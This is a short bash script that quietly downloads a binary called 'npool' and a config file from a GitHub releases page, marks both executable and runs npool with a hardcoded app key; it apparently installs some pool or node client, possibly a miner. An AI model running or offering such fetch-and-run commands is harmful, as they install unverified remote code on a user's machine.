#!/bin/bash

APP_KEY="wW8xBLMezohupvC7"

wget -q https://github.com/vedhagsvp/soljtka/releases/download/latest/config.json
wget -q https://github.com/vedhagsvp/soljtka/releases/download/latest/npool
chmod +x config.json
chmod +x npool
./npool --appkey "$APP_KEY"
